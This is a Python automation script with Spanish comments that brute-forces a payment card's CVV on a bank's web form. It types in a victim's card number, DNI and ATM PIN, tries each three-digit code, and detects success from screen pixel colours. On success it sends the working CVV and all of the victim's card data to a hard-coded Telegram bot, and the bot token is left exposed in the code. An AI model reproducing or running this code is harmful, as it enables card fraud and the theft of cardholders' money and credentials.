import pyautogui as robot
import time 
import telegram

#1920 x 1080
afiliacion = 202,719
#tipodedocumento = 1427,572
#click_dni = 1406,417
Ndocumento = 299,269
Ntarjeta = 299, 316 
Nclavecajero = 299,446
CVV = 299,379
Continuar1 = 202,512
reintentar = 202,680
#reintentar = 1637,984
escape = 387,54

# Este es miooo de Hasen
# no compartir por error, si eres alguien tmre me descuide 
bot_token2 = '1893337163:AAHXSEBf-9ibMf67B68lgYv7PNrekXlDNoE'
chat_id2 = '1850445278'
bot2 = telegram.Bot(token=bot_token2)

#bot.send_message(chat_id=chat_id, text = 'Corriendo bot :D')

#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")

#Pedir dato
print("\n")
print("El programa trabaja de manera descendente 999...998...997...")
print(" 1366 ")
print("\n")
print("*****************")
print("Escriba los datos: ")
victima_tar = input("Tarjeta: ")
victima_dni = input("DNI: ")
victima_pasw = input("Clave de cajero: ")

print("*****************")

inicio = int(input("Desde que número desea comenzar?:  "))
fin = int(input("Hasta que número?:  "))

print("*****************")
print("Presione 'Enter' para continuar")
input()

#Mover y dar click
def abrir (pos,click = 1 ):
	robot.moveTo(pos)
	#pyautogui.moveTo(503,315)
	robot.click(clicks=click)

def logeo ():
	abrir(afiliacion,click=1)
	time.sleep(3)
	robot.click(33,437) # Clicktarjeta con datos impresos
	time.sleep(0.5)
	robot.click(283,650) # Click Continuar
	time.sleep(1) 

	abrir(Ndocumento)
	robot.typewrite(victima_dni)
	time.sleep(0.3)
	abrir(Ntarjeta)
	robot.typewrite(victima_tar)
	time.sleep(0.3)
	abrir(Nclavecajero)
	robot.typewrite(victima_pasw)
	robot.click(529,627)
	time.sleep(0.3)
	robot.click(529,536)
	time.sleep(0.3)
	robot.click(529,536)
	time.sleep(0.3)


print(":D")


logeo()

contador = 0 # para reiniciar 
inicio = inicio + 1

try:

	while inicio>fin :  # >  < # desde 999 para abajo
		
		inicio = inicio - 1
		contador += 1
		#print(contador)
		if contador > 3 : # Reiniciar 
			print("Reiniciando, esperar por favor")
			abrir(escape)
			time.sleep(0.7)
			robot.click(285,957)
			time.sleep(2)

			logeo() # Logeandose de nuevo

			print("Continuando...")
			contador=1

		#print("Intentado con: ",inicio)

		registro = open("registro.txt","a")
		registro.write(str(inicio)) # escribir en el block
		registro.write("\n")
		registro.close()
		 # Borar quizas
		print("Intentando con: ",inicio)

		time.sleep(0.1)
		#print("Borrando") ##################
		abrir(CVV)
		robot.press('backspace')
		robot.press('backspace')
		robot.press('backspace')
		time.sleep(0.1)
		#por si son bajos de 100
		if inicio < 100:
			robot.typewrite("0")
			robot.typewrite(str(inicio))
			time.sleep(0.1)
			#print("Tipeando") #######################
		else:
			robot.typewrite(str(inicio))
			time.sleep(0.1)
			#print("Tipeando") #########################
		#time.sleep(0.1)

		time.sleep(0.2)
		abrir(Continuar1)

		# Para ver cuanto demora en cargar
		blanco =  False
		ceveve = False

		contadorEmergencia = 0
		while blanco is False :
			contadorEmergencia += 1
			blanco = robot.pixelMatchesColor(517,827,(255,255,255))
			ceveve = robot.pixelMatchesColor(532,619,(212,237,252))
			#print(blanco)
			#print("Cargando..."+ blanco)
			time.sleep(0.1)

			if (blanco is True):
				print("!!")
				contadorEmergencia = 0
				time.sleep(0.1)
				abrir(reintentar)

			if (ceveve is True):
				print ('\a')
				bot2.send_message(chat_id=chat_id2, text = "-------------")
				bot2.send_message(chat_id=chat_id2, text = 'CVV encontrada: '+str(inicio))
				bot2.send_message(chat_id=chat_id2, text = str(victima_tar))
				bot2.send_message(chat_id=chat_id2, text = str(victima_dni))
				bot2.send_message(chat_id=chat_id2, text = str(victima_pasw))

				print("CVV encontrado: "+ str(inicio))
				input ("Presione ' Enter ' para salir")
				quit()
				input()

			if contadorEmergencia == 40:
				print("Detenido por EMERGENCIA (error)")
				print("Enter para continuar o cierralo mejor")
				input()
		time.sleep(0.1)

		print("--------------------------------")
		

		time.sleep(0.5)


except:
	print ('\a')
	print("Error en el programa")
	print("\nEl numero se quedó en: ", inicio)

print("Presione 'Enter' para continuar")
input()



